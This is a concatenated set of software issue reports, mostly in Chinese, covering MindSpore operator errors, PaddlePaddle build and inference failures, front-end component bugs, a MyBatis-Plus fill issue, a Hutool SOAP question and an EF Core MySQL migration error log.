epoch time: 1970.966 ms, per step time: 98.548 ms Train epoch time: 1975.647 ms, per step time: 98.782 ms Train epoch time: 1994.227 ms, per step time: 99.711 ms Train epoch time: 1981.609 ms, per step time: 99.080 ms Train epoch time: 1995.177 ms, per step time: 99.759 ms Train epoch time: 1987.321 ms, per step time: 99.366 ms Train epoch time: 1988.517 ms, per step time: 99.426 ms Train epoch time: 1968.955 ms, per step time: 98.448 ms Train epoch time: 1970.144 ms, per step time: 98.507 ms"
[CT][MS]算子segmentsum 动态shape报错,"受框架调整影响部分算子的动态shape现在实现不了 RuntimeError: The int64_t value(-1000000) is less than 0 / 硬件环境: /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行用例 passed   <code>: def test_dynamic_shape_segmentsum_input_2x3_segments_0x0_dtype_float16_and_int32(): input_list = [] input_list.append(Tensor(np.random.randn(2, 2, 3).astype(np.float16), dtype=mstype.float16)) input_list.append(Tensor(np.array((0, 0)).astype(np.int32), dtype=mstype.int32)) fact = SegmentSumMock(inputs=input_list) &gt; fact.forward_dynamic_shape_cmp() _____________________________________________ test_dynamic_shape_segmentsum_input_2x3_segments_0x0_dtype_float16_and_int32 ______________________________________________ @Author(""z30027206"") @Level2 @SKIP_ENV_CPU() @SKIP_ENV_DAVINCI_EXECUTOR() def test_dynamic_shape_segmentsum_input_2x3_segments_0x0_dtype_float16_and_int32(): input_list = [] input_list.append(Tensor(np.random.randn(2, 2, 3).astype(np.float16), dtype=mstype.float16)) input_list.append(Tensor(np.array((0, 0)).astype(np.int32), dtype=mstype.int32)) fact = SegmentSumMock(inputs=input_list) &gt; fact.forward_dynamic_shape_cmp() test_segmentsum.py:897: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/segmentsum_ops.py:186: in forward_dynamic_shape_cmp out_ms = self.forward_mindspore_dynamic_shape_impl() ../share/ops/primitive/segmentsum_ops.py:121: in forward_mindspore_dynamic_shape_impl out_ms_rank = ms_net(self.input_x, self.segment_id, indices_ms) ../share/utils.py:185: in __call__ out = super().__call__(*args, **kwargs) /root/miniconda3/envs/zxop3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:591: in __call__ out = self.compile_and_run(*args) /root/miniconda3/envs/zxop3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:979: in compile_and_run self.compile(*inputs) /root/miniconda3/envs/zxop3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:962: in compile jit_config_dict=self._jit_config_dict) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7f3848313890&gt;, obj = WrapOp&lt;&gt;, phase = 'train.1663314941668979712.139870056397712.50', do_convert = True auto_parallel_mode = False, jit_config_dict = {} def compile(self, obj, *args, phase='predict', do_convert=True, auto_parallel_mode=False, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. auto_parallel_mode: When set to True, use auto parallel mode to compile graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args self.enable_tuple_broaden = False if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) &gt; result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) E RuntimeError: The int64_t value(-1000000) is less than 0. E E ---------------------------------------------------- E - The Traceback of Net Construct Code: E ---------------------------------------------------- E The function call stack (See file '/home/zx/segementmean/MindSporeTest/operations/rank_0/om/analyze_fail.dat' for more details. Get instructions about `analyze_fail.dat` at https://www.mindspore.cn/search?inputValue=analyze_fail.dat): E # 0 In file /home/zx/segementmean/MindSporeTest/share/ops/primitive/segmentsum_ops.py:37 E out = self.segment_sum(x1, x2) E ^ E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/core/utils/convert_utils_base.h:80 LongToUint /root/miniconda3/envs/zxop3.7/lib/python3.7/site-packages/mindspore/common/api.py:1130: RuntimeError"
表格搜索条件查询栏,"2.8.11版本 某一列的prop: 'search'，搜索栏不显示该搜索组件，更换其他prop正常。   <code>: { label: '搜索', prop: 'search', span: 24, search: true, searchPlaceholder: '搜索' }"
Delete unused deb build path,Delete unused path   <code>: paddle/scripts/deb/
PaddlePaddle build fails,"When running PaddlePaddle build on commit 83ddafb with cmake options: the command fails with:   <code>: cmake -DWITH_DOC=OFF -DWITH_GPU=OFF -DWITH_DISTRIBUTE=OFF -DWITH_MKLDNN=ON -DWITH_GOLANG=OFF -DWITH_SWIG_PY=ON -DWITH_STYLE_CHECK=OFF -DCMAKE_EXPORT_COMPILE_COMMANDS=ON -DCMAKE_BUILD_TYPE=Debug -DWITH_TESTING=ON -DWITH_TIMER=ON -DWITH_PROFILER=ON -DWITH_INFERENCE_API_TEST=ON .. make [ 97%] Linking CXX executable test_analyzer ../api/libpaddle_inference_api.a(api_impl.cc.o): In function `paddle::inference::DescribeZeroCopyTensor(paddle::ZeroCopyTensor const&amp;)': /home/wojtuss/repos/PaddlePaddle/Paddle/paddle/fluid/inference/api/helper.h:209: undefined reference to `paddle::ZeroCopyTensor::shape() const' /home/wojtuss/repos/PaddlePaddle/Paddle/paddle/fluid/inference/api/helper.h:211: undefined reference to `paddle::ZeroCopyTensor::lod() const' /home/wojtuss/repos/PaddlePaddle/Paddle/paddle/fluid/inference/api/helper.h:218: undefined reference to `float* paddle::ZeroCopyTensor::data&lt;float&gt;(paddle::PaddlePlace*, int*) const' collect2: error: ld returned 1 exit status paddle/fluid/inference/analysis/CMakeFiles/test_analyzer.dir/build.make:451: recipe for target 'paddle/fluid/inference/analysis/test_analyzer' failed make[2]: *** [paddle/fluid/inference/analysis/test_analyzer] Error 1 CMakeFiles/Makefile2:47281: recipe for target 'paddle/fluid/inference/analysis/CMakeFiles/test_analyzer.dir/all' failed make[1]: *** [paddle/fluid/inference/analysis/CMakeFiles/test_analyzer.dir/all] Error 2 Makefile:160: recipe for target 'all' failed make: *** [all] Error 2"
下拉框无法关闭,"Version:1.1.5 EL的DOM模式和CSS选择器模式都无法在失去焦点时关闭下拉框，只有在点击另一XM下拉框时，另一个下拉框才会关闭   <code>: HTML: &lt;div class=""form-group""&gt; &lt;label&gt;国家出资企业:&lt;/label&gt; &lt;!-- &lt;select multiple=""true"" id=""gjczqy_select"" name=""gjczqy""&gt; &lt;/select&gt; --&gt; &lt;div id=""gjczqy_select"" style=""width:200px;""&gt;&lt;/div&gt; &lt;/div&gt; JS: xmSelect.render({ el: '#gjczqy_select', autoRow: true, paging: true, filterable: true, data: res.data.map(function(val){ return {name:val.name,value:val.unitid} }) })"
Agg类型的后端支持,"现状： 对于agg类型，现在后端的支持是不完善不正确的。比如 这里在后端lowering时，生成对应的指令偏移错误： 查看代码,发现我们并不支持，以下几个方面需要支持： 1.agg类型的直接操作，如dread, dassign 2.agg类型作为函数参数 3.agg类型作为函数返回值   <code>: type $record._ZN11default10009RectangleE &lt;struct { @width i32 public, @length i32 public}&gt; func &amp;_ZN11default100015codegenUnitTestEv (reg %1 i32) i32 { funcid 0 var %n_0 &lt;$record._ZN11default10009RectangleE&gt; LOC 1 10 return (add i32 (dread agg %n_0 1, dread agg %n_0 2)) } ldr w0, [x29,#16] // local var: n_0，1 ldr w1, [x29,#16] // local var: n_0, 2. this is wrong code add w0, w0, w1"
.layui-table的标签加了一个lay-data后单元格中的按钮无法渲染,"版本：2.7.6 描述：我在Django模板中用来展示表格数据，为了方便操作每行都有一个单元格中有三个，当我尝试给表格加上分页（）后，单元格中的所有变成了对应的字符串文本 加上前   <code>: &lt;table class=""layui-table""&gt; layui-btn lay-data=""{page:true}"" layui-btn lay-data lay-data"
Check Failed: size != 0,错误如题，本地调试时出现如下问题，相应的脚本文件和数据已经上传，请Paddle同学帮忙看看 F0721 11:04:24.647970 25445 MemoryHandle.cpp:49] Check failed: size != 0 allocate 0 bytes *** Check failure stack trace: *** @ 0x7f56f41f9e6d google::LogMessage::Fail() @ 0x7f56f41fd91c google::LogMessage::SendToLog() @ 0x7f56f41f9993 google::LogMessage::Flush() script_test_folder2.zip   <code>: @ 0x7f56f41fee2e google::LogMessageFatal::~LogMessageFatal() @ 0x7f56f4165b39 paddle::CpuMemoryHandle::CpuMemoryHandle() @ 0x7f56f413b6be paddle::CpuVectorT&lt;&gt;::CpuVectorT() @ 0x7f56f413c39a paddle::VectorT&lt;&gt;::create() @ 0x7f56f41e2e02 IVector::create() @ 0x7f56f3ee4f87 _wrap_IVector_create @ 0x4a9e33 PyEval_EvalFrameEx @ 0x4ad70d PyEval_EvalCodeEx @ 0x4aa88c PyEval_EvalFrameEx @ 0x4aa9a7 PyEval_EvalFrameEx @ 0x4aa9a7 PyEval_EvalFrameEx @ 0x4ad70d PyEval_EvalCodeEx @ 0x51c1f0 function_call
[CT][MS][CountNonZero]Err msg need update,"参数dims取无效值时，报错信息有待优化 / 硬件环境: /device ascend/CPU : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行测试用例 能够校验住异常值， 给出指导性的提示信息   <code>: def test_countnonzero_dims_value_out_of_left_bound(): x = Tensor(np.random.randn(10, 10), dtype=mstype.float32) fact = CountNonZeroMock(attributes={'dims': -3}, inputs=[x]) # with pytest.raises(ValueError): &gt; fact.forward_mindspore_impl() def test_countnonzero_dims_value_out_of_right_bound(): x = Tensor(np.random.randn(10, 10), dtype=mstype.float32) fact = CountNonZeroMock(attributes={'dims': 2}, inputs=[x]) with pytest.raises(ValueError): fact.forward_mindspore_impl() def test_countnonzero_dims_value_out_of_left_bound(): x = Tensor(np.random.randn(10, 10), dtype=mstype.float32) fact = CountNonZeroMock(attributes={'dims': -3}, inputs=[x]) # with pytest.raises(ValueError): &gt; fact.forward_mindspore_impl() E ValueError: For 'CountNonZero', the dims[0] is invalid."
@TableField.fill设置为FieldFill.INSERT_UPDATE不起作用,"使用版本 2.3版本 @TableField注解的fill设置为“FieldFill.INSERT_UPDATE”，不起作用 1、定义一个User类，并设置好setter和getter 2、测试代码 （1）插入时，没有给表中的update_time字段设置值 （2）更新时，也没有给表中的update_time字段设置值 生成的sql如下： Preparing: UPDATE sys_user SET user_name=?, update_time=? WHERE id=? Parameters: tom-1(String), null, 1005025463877996546(Long) 运行正常，@TableField注解的fill设置为“FieldFill.INSERT_UPDATE”，不起作用，在insert和update操作是没有给字段赋值 联系方式   <code>: @TableName(""sys_user"") public class User{ @TableId(value = ""UUID"",type = IdType.UUID) private Long id; @TableField(""user_name"") private String name; @TableField(value = ""update_time"", fill = FieldFill.INSERT_UPDATE) private Date updateTime; //setter &amp; getter ... } User user = new User(); user.setName(""tom""); int result = userMapper.insert(user); Assert.assertEquals(1, result); User user = new User(); user.setId(1005025463877996546L); user.setName(""tom-1""); int result = userMapper.updateById(user); Assert.assertEquals(1, result);"
动态图DataParallel使用问题,"paddle1.8.2动态图： 在使用单卡模式没有问题， 但是 会报： ，应该如何使用？ 另外在多卡模式下每个print多会打印多次，该如何避免，每次打印前都加上 么   <code>: self.model.loss(a,b) self.model = fluid.dygraph.parallel.DataParallel(self.model, strategy) self.model.loss(a,b) AttributeError: 'DataParallel' object has no attribute 'loss' if fluid.dygraph.parallel.Env().local_rank == 0："
[鹏城猛犸杯推理BUG]推理网络sum卡死,"class InferNet(nn.Cell): 163 164 def init(self, net): 165 super().init() 166 self.net = net 167 self.reduce_sum = P.ReduceSum() 168 self.cast = P.Cast() 169 170 def construct(self, x, edge_weight, pos_edge_idx, neg_edge_idx, n_nodes, n_edges, node_mask, pos_edge_mask, neg_edge_mask): 171 """"""VGAE Net with loss function"""""" 172 #print(f""pos_edge_idx,{pos_edge_idx[0]}"") 173 feat, dae_loss, vgae_loss = self.net(x, edge_weight, pos_edge_idx, neg_edge_idx, n_nodes, n_edges, node_mask, pos_edge_mask, neg_edge_mask) 174 return feat, self.reduce_sum(self.cast(node_mask, ms.float32)) 在reducesun处卡死，无报错 下面的写法也会卡死在.sum() actual_nodes = node_mask.asnumpy().sum() 277 #print('idx shape',idx.shape) 278 print('before self.model') 279 st_model = time.perf_counter() 280 feat, _, _, = self.model(x, edge_weight, pos_edge_idx, neg_edge_idx, n_nodes, n_edges, node_mask, pos_edge_mask, neg_edge_mask) 下面的写法不会卡死 actual_nodes = np.sum(node_mask.asnumpy()) Hardware Environment() / 硬件环境: Ascend device ascend : -- MindSpore version (e.g., 1.8.0.Bxxx) : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph   <code>: #print('idx shape',idx.shape) print('before self.model') st_model = time.perf_counter() feat, _, _ = self.model(node_feat, edge_weight, pos_edge_idx, neg_edge_idx, n_nodes, n_edges, node_mask, pos_edge_mask, neg_edge_mask)"
【众智】【计算-AICPU开发】LeftShift,AICPU算子接入 将tensor每个位置的值左移若干位。 x1 x2 y 对应底层算子 对应底层AICPU算子LeftShift 无需接入反向算子。   <code>: class LeftShift(Primitive):
compile error in GPU,"We can not use eigen in pool_op.h, it leads to compile error in pool_op.cu.cc   <code>: libpaddle_fluid.a(pool_op.cu.cc.o):/usr/include/c++/5/bits/basic_ios.h:372: first defined here libpaddle_fluid.a(pool_op.cu.cc.o): In function `paddle::operators::PoolGradKernel&lt;paddle::platform::CUDADeviceContext, double&gt;::Compute(paddle::framework::ExecutionContext const&amp;) const': pool_op.cu.cc:(.text._ZNK6paddle9operators14PoolGradKernelINS_8platform17CUDADeviceContextEdE7ComputeERKNS_9framework16ExecutionContextE[_ZNK6paddle9operators14PoolGradKernelINS_8platform17CUDADeviceContextEdE7ComputeERKNS_9framework16ExecutionContextE]+0x85a): undefined reference to `Eigen::internal::TensorExecutor&lt;Eigen::TensorAssignOp&lt;Eigen::TensorMap&lt;Eigen::Tensor&lt;double, 1, 1, long&gt;, 0, Eigen::MakePointer&gt;, Eigen::TensorCwiseNullaryOp&lt;Eigen::internal::scalar_constant_op&lt;double&gt;, Eigen::TensorMap&lt;Eigen::Tensor&lt;double, 1, 1, long&gt;, 0, Eigen::MakePointer&gt; const&gt; const&gt; const, Eigen::GpuDevice, false&gt;::run(Eigen::TensorAssignOp&lt;Eigen::TensorMap&lt;Eigen::Tensor&lt;double, 1, 1, long&gt;, 0, Eigen::MakePointer&gt;, Eigen::TensorCwiseNullaryOp&lt;Eigen::internal::scalar_constant_op&lt;double&gt;, Eigen::TensorMap&lt;Eigen::Tensor&lt;double, 1, 1, long&gt;, 0, Eigen::MakePointer&gt; const&gt; const&gt; const&amp;, Eigen::GpuDevice const&amp;)' libpaddle_fluid.a(pool_op.cu.cc.o): In function `paddle::operators::PoolGradKernel&lt;paddle::platform::CUDADeviceContext, float&gt;::Compute(paddle::framework::ExecutionContext const&amp;) const': pool_op.cu.cc:(.text._ZNK6paddle9operators14PoolGradKernelINS_8platform17CUDADeviceContextEfE7ComputeERKNS_9framework16ExecutionContextE[_ZNK6paddle9operators14PoolGradKernelINS_8platform17CUDADeviceContextEfE7ComputeERKNS_9framework16ExecutionContextE]+0x839): undefined reference to `Eigen::internal::TensorExecutor&lt;Eigen::TensorAssignOp&lt;Eigen::TensorMap&lt;Eigen::Tensor&lt;float, 1, 1, long&gt;, 0, Eigen::MakePointer&gt;, Eigen::TensorCwiseNullaryOp&lt;Eigen::internal::scalar_constant_op&lt;float&gt;, Eigen::TensorMap&lt;Eigen::Tensor&lt;float, 1, 1, long&gt;, 0, Eigen::MakePointer&gt; const&gt; const&gt; const, Eigen::GpuDevice, false&gt;::run(Eigen::TensorAssignOp&lt;Eigen::TensorMap&lt;Eigen::Tensor&lt;float, 1, 1, long&gt;, 0, Eigen::MakePointer&gt;, Eigen::TensorCwiseNullaryOp&lt;Eigen::internal::scalar_constant_op&lt;float&gt;, Eigen::TensorMap&lt;Eigen::Tensor&lt;float, 1, 1, long&gt;, 0, Eigen::MakePointer&gt; const&gt; const&gt; const&amp;, Eigen::GpuDevice const&amp;)'"
Add object detection data reader for slim MKLDNNPostTrainingQuantStrategy,"In , only support image classifications. object detection models data reader should be added later. [removed TODO] slim/quantization/mkldnn_post_training_strategy.py:86:   <code>: mkldnn_post_training_strategy.py MKLDNNPostTrainingQuantStrategy # TODO (Intel) Remove limits that MKLDNNPostTrainingQuantStrategy only for image classifications’ input issue"
【众智】【计算-AICPU接入】RaggedRange,"AICPU算子接入 返回包含指定区间的数字序列RaggedTensor。 接口目录：mindspore/ops/operation/math_ops.py starts limits deltas Tsplits mindspore.dtype 属性 rt_nested_splits rt_dense_values 对应底层算子 对应底层AI CPU算子RaggedRange 标杆接口参考 TF接口： tf.raw_ops.RaggedRange https://tensorflow.google.cn/api_docs/python/tf/raw_ops/RaggedRange 3. 异常处理 4. 算子反向 无反向   <code>: class RaggedRange(Primitive): REG_OP(RaggedRange) .INPUT(starts, TensorType({DT_FLOAT,DT_DOUBLE,DT_INT32,DT_INT64})) .INPUT(limits, TensorType({DT_FLOAT,DT_DOUBLE,DT_INT32,DT_INT64})) .INPUT(deltas, TensorType({DT_FLOAT,DT_DOUBLE,DT_INT32,DT_INT64})) .OUTPUT(rt_nested_splits, TensorType({DT_INT32, DT_INT64})) .OUTPUT(rt_dense_values, TensorType({DT_FLOAT,DT_DOUBLE,DT_INT32,DT_INT64})) .REQUIRED_ATTR(Tsplits, Type) .OP_END_FACTORY_REG(RaggedRange)"
ImageFolderDataset读取灰度图像问题,": /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : mindspore.dataset.ImageFolderDataset接口读取图片，读出的格式是RGB模式，无法在中间转化为灰度图像，导致读出的Channel是3，item['image'].type = [5,3,28,28]。而后续需要自己使用切片方法将通道数变为[5,1,28,28] pytorch是通过继承重新dataset里的__getitem__()中，使用PIL的Image.convert('L')实现RGB转化灰度图 item['image'].type = [5,1,28,28]   <code>: def test(): data_folder1 = './datas' data_loader = ds.ImageFolderDataset(dataset_path=data_folder1) #data_set = create_dataset(data_loader) #print(data_loader.create_dict_iterator()) for item in data_loader.create_dict_iterator(): print(item['image'].shape) print(item['label'].shape) print('*'*50) test()"
fluid训练的模型v2预测，header.size==getSize()出错,"模型训练：fluid 版本1.3.0 环境 cpu python2.7 模型预测：paddle-0.8.0b3.dist 错误信息： outputs 训练模型结构： 预测部分代码： 预测模型结构： `def deepctr_net(input_dim, class_dim=2, emb_dim=64, fea_dim=128, is_predict=False):   <code>: [WARNING 2019-05-13 19:59:32,275 networks.py:1438] routine try to calculate network's inputs and outputs order. It might not work well.Please see follow log carefully. [INFO 2019-05-13 19:59:32,281 networks.py:1466] The input order is ... [INFO 2019-05-13 19:59:32,281 networks.py:1472] The output order is [output, output2, __concat_5__, __concat_2__] I0513 19:59:32.496774 37131 GradientMachine.cpp:123] Loading parameters from data_online/model F0513 19:59:32.551892 37131 Parameter.cpp:377] Check failed: header.size == getSize() (1532928 vs. 1471488) The size (1532928) in the file does not match the size (1471488) of the parameter: _fc1.w0 *** Check failure stack trace: *** @ 0x7f3304aa1c68 google::LogMessage::Fail() @ 0x7f3304aa1bc0 google::LogMessage::SendToLog() @ 0x7f3304aa1655 google::LogMessage::Flush() @ 0x7f3304aa4416 google::LogMessageFatal::~LogMessageFatal() @ 0x7f330426515f paddle::Parameter::load() @ 0x7f330426584d paddle::Parameter::load() @ 0x7f330420a79a paddle::GradientMachine::loadParameters() @ 0x7f33040e99c8 _wrap_GradientMachine_loadParameters @ 0x4b4cb9 PyEval_EvalFrameEx @ 0x4b6b28 PyEval_EvalCodeEx @ 0x4b5d10 PyEval_EvalFrameEx @ 0x4b6b28 PyEval_EvalCodeEx @ 0x529340 function_call @ 0x422cba PyObject_Call @ 0x4271ad instancemethod_call @ 0x422cba PyObject_Call @ 0x48121f slot_tp_init @ 0x47eb1a type_call @ 0x422cba PyObject_Call @ 0x4b31dd PyEval_EvalFrameEx @ 0x4b5fb8 PyEval_EvalFrameEx @ 0x4b6b28 PyEval_EvalCodeEx @ 0x4b6c52 PyEval_EvalCode @ 0x4e1c7d PyRun_FileExFlags @ 0x4e3501 PyRun_SimpleFileExFlags @ 0x4159dd Py_Main @ 0x7f330bf41bd5 __libc_start_main @ 0x414b71 (unknown) E_AgeId = word_emb(age, AGE_SIZE, 8) E_GenderId = word_emb(gender, GENDER_SIZE, 8) E_MultiPreqIds = text_cnn(preq_ids) E_QueryProfile = text_cnn(query_profile_ids) E_WordProfile = text_cnn(click_word_profile_ids) conf = parse_config(train_conf, ""is_predict=1"") self.network = swig_paddle.GradientMachine.createFromConfigProto(conf.model_config) self.network.loadParameters(self.model_dir) E_AgeId = embedding_layer(input=data_layer(""AgeId"", 9), size=8) E_GenderId = embedding_layer(input=data_layer(""GenderId"", 3), size=8) embedding2 = embedding_layer(input=data_layer(""MultiPreqIds"", input_dim), size=emb_dim) E_MultiPreqIds = text_conv_pool(input=embedding2, context_len=5, hidden_size=fea_dim) embedding3 = embedding_layer(input=data_layer(""QueryProfile"", input_dim), \ size=emb_dim) #, \ E_QueryProfile = text_conv_pool(input=embedding3, context_len=5, hidden_size=fea_dim) embedding4 = embedding_layer(input=data_layer(""WordProfile"", input_dim), \ size=emb_dim) #, \ E_WordProfile = text_conv_pool(input=embedding4, context_len=5, hidden_size=fea_dim)`"
SoapClient问题,"JDK版本： openjdk_8_201 hutool版本： 5.3.4 比如报错的Excel文件，有问题的图片等。   <code>: public static void main(String[] args) { Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(""key"", ""xxxxxx""); map.put(""city"", ""珠海市""); map.put(""district"",""横琴新区""); SoapClient soapClient = SoapClient.create(""http://kaixuan.55555.io/webService/builtInPropertiesWebService?wsdl"", SoapProtocol.SOAP_1_1) .setCharset(CharsetUtil.CHARSET_UTF_8) .setMethod(""hzt:findOrganizationByCityAndCounty"", ""http://www.hztianque.com"").setParams(map); Console.log(soapClient.getMsgStr(true)); Console.log(""----------------------------------""); Console.log(soapClient.send(true)); } 输出的xml格式是： &lt;?xml version=""1.0"" encoding=""UTF-8"" standalone=""no""?&gt; &lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/""&gt; &lt;SOAP-ENV:Header/&gt; &lt;SOAP-ENV:Body&gt; &lt;hzt:findOrganizationByCityAndCounty xmlns:hzt=""http://www.hztianque.com""&gt; &lt;hzt:city&gt;珠海市&lt;/hzt:city&gt; &lt;hzt:district&gt;横琴新区&lt;/hzt:district&gt; &lt;hzt:key&gt;xxxxx&lt;/hzt:key&gt; &lt;/hzt:findOrganizationByCityAndCounty&gt; &lt;/SOAP-ENV:Body&gt; &lt;/SOAP-ENV:Envelope&gt; 我用soap-ui输出的xml格式是： * &lt;soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:hzt=""http://www.hztianque.com""&gt; * &lt;soapenv:Header/&gt; * &lt;soapenv:Body&gt; * &lt;hzt:findOrganizationByCityAndCounty&gt; * &lt;key&gt;xxxxx&lt;/key&gt; * &lt;city&gt;珠海市&lt;/city&gt; * &lt;district&gt;&lt;/district&gt; * &lt;/hzt:findOrganizationByCityAndCounty&gt; * &lt;/soapenv:Body&gt; * &lt;/soapenv:Envelope&gt; 用Hutool输出的格式报如下错误： &lt;?xml version=""1.0"" encoding=""UTF-8"" standalone=""no""?&gt; &lt;soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/""&gt; &lt;soap:Body&gt; &lt;soap:Fault&gt; &lt;faultcode&gt;soap:Server&lt;/faultcode&gt; &lt;faultstring&gt;Found element {http://www.hztianque.com}city but could not find matching RPC/Literal part&lt;/faultstring&gt; &lt;/soap:Fault&gt; &lt;/soap:Body&gt; &lt;/soap:Envelope&gt;"
迁移Mysql后执行报错,"【时间】2021-12-26 15:20:53,319 【等级】INF 【消息】Entity Framework Core 6.0.1 initialized 'DefaultDbContext' using provider 'Pomelo.EntityFrameworkCore.MySql:6.0.0' with options: SensitiveDataLoggingEnabled DetailedErrorsEnabled MigrationsAssembly=Admin.NET.Database.Migrations ServerVersion 8.0.22-mysql 【时间】2021-12-26 15:20:53,330 【等级】INF 【消息】Entity Framework Core 6.0.1 initialized 'DefaultDbContext' using provider 'Pomelo.EntityFrameworkCore.MySql:6.0.0' with options: SensitiveDataLoggingEnabled DetailedErrorsEnabled MigrationsAssembly=Admin.NET.Database.Migrations ServerVersion 8.0.22-mysql 【时间】2021-12-26 15:20:53,381 【等级】INF 【消息】Entity Framework Core 6.0.1 initialized 'DefaultDbContext' using provider 'Pomelo.EntityFrameworkCore.MySql:6.0.0' with options: SensitiveDataLoggingEnabled DetailedErrorsEnabled MigrationsAssembly=Admin.NET.Database.Migrations ServerVersion 8.0.22-mysql 【时间】2021-12-26 15:20:53,387 【等级】INF 【消息】Executed DbCommand (3ms) [Parameters=[@__input_Code_0='org_type' (Size = 50)], CommandType='Text', CommandTimeout='30'] SELECT ., ., ., ., ., ., ., ., ., ., ., ., . FROM AS WHERE . = @__input_Code_0 LIMIT 1 【时间】2021-12-26 15:20:53,404 【等级】INF 【消息】Executed DbCommand (1ms) [Parameters=[@__dictTypeId_0='142307070926942'], CommandType='Text', CommandTimeout='30'] SELECT ., ., ., ., ., ., ., ., ., ., ., ., ., . FROM AS INNER JOIN AS ON . = . WHERE (. = @__dictTypeId_0) AND (. = 0) ORDER BY . 【时间】2021-12-26 15:20:53,510 【等级】ERR 【消息】Failed executing DbCommand (17ms) [Parameters=[@__ef_filter__p_0='142307070918780' (DbType = Int64)], CommandType='Text', CommandTimeout='30'] SELECT ., . AS , . AS , CAST(. AS longtext) AS , . AS FROM AS WHERE ((. = @__ef_filter__p_0) AND NOT (.)) AND (. = 0) ORDER BY . 【时间】2021-12-26 15:20:53,519 【等级】INF 【消息】Executed DbCommand (2ms) [Parameters=[@__ef_filter__p_0='142307070918780' (DbType = Int64)], CommandType='Text', CommandTimeout='30'] SELECT COUNT(*) FROM AS WHERE ((. = @__ef_filter__p_0) AND NOT (.)) AND (. &lt;&gt; 2) 【时间】2021-12-26 15:20:53,520 【等级】ERR 【消息】An exception occurred while iterating over the results of a query for context type 'Admin.NET.EntityFramework.Core.DefaultDbContext'. MySqlConnector.MySqlException (0x80004005): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'longtext) AS , . AS FROM AS WHERE ((' at line 1 at MySqlConnector.Core.ResultSet.ReadResultSetHeaderAsync(IOBehavior ioBehavior) in /<em>/src/MySqlConnector/Core/ResultSet.cs:line 44 at MySqlConnector.MySqlDataReader.ActivateResultSet(CancellationToken cancellationToken) in /</em>/src/MySqlConnector/MySqlDataReader.cs:line 107 at MySqlConnector.MySqlDataReader.CreateAsync(CommandListPosition commandListPosition, ICommandPayloadCreator payloadCreator, IDictionary1 commands, ICommandPayloadCreator payloadCreator, CommandBehavior behavior, Activity activity, IOBehavior ioBehavior, CancellationToken cancellationToken) in /<em>/src/MySqlConnector/Core/CommandExecutor.cs:line 56 at MySqlConnector.MySqlCommand.ExecuteReaderAsync(CommandBehavior behavior, IOBehavior ioBehavior, CancellationToken cancellationToken) in /</em>/src/MySqlConnector/MySqlCommand.cs:line 313 at MySqlConnector.MySqlCommand.ExecuteDbDataReaderAsync(CommandBehavior behavior, CancellationToken cancellationToken) in /<em>/src/MySqlConnector/MySqlCommand.cs:line 305 at Microsoft.EntityFrameworkCore.Storage.RelationalCommand.ExecuteReaderAsync(RelationalCommandParameterObject parameterObject, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.Storage.RelationalCommand.ExecuteReaderAsync(RelationalCommandParameterObject parameterObject, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.Query.Internal.SingleQueryingEnumerable4 operation, Func1.AsyncEnumerator.MoveNextAsync() 【时间】2021-12-26 15:20:53,699 【等级】ERR 【消息】Failed executing DbCommand (178ms) [Parameters=[@__ef_filter__p_0='142307070918780' (DbType = Int64), @__p_1='10', @__p_0='0'], CommandType='Text', CommandTimeout='30'] SELECT ., CAST(. AS longtext) AS , CAST(. AS longtext) AS , ., ., ., ., ., ., CAST(. AS int) AS FROM AS WHERE ((. = @__ef_filter__p_0) AND NOT (.)) AND (. &lt;&gt; 2) ORDER BY . LIMIT 